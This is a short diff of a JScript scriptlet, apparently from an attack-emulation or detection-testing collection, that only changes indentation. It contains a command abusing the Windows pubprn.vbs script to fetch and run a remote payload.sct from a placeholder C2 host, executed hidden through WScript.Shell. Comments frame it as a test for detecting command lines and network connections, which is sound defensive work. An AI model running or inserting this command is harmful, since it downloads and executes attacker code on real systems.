@@ -14,9 +14,9 @@
 	<script language="JScript">
 		<![CDATA[
 	    		// Commands in "cmd" should launch, this could be any arbitrary code.
-      	  // What you are hoping to catch is the cmdline, modloads, or network connections, or any variation
-			    cmd = "C:\\Windows\\SysWOW64\\CScript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script:http://<ip_of_C2>/payload.sct";
-          var r = new ActiveXObject("WScript.Shell").Run(cmd, 0, true);
+      	                // What you are hoping to catch is the cmdline, modloads, or network connections, or any variation
+			cmd = "C:\\Windows\\SysWOW64\\CScript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script:http://<ip_of_C2>/payload.sct";
+                        var r = new ActiveXObject("WScript.Shell").Run(cmd, 0, true);
 		]]>
 </script>
 </registration>
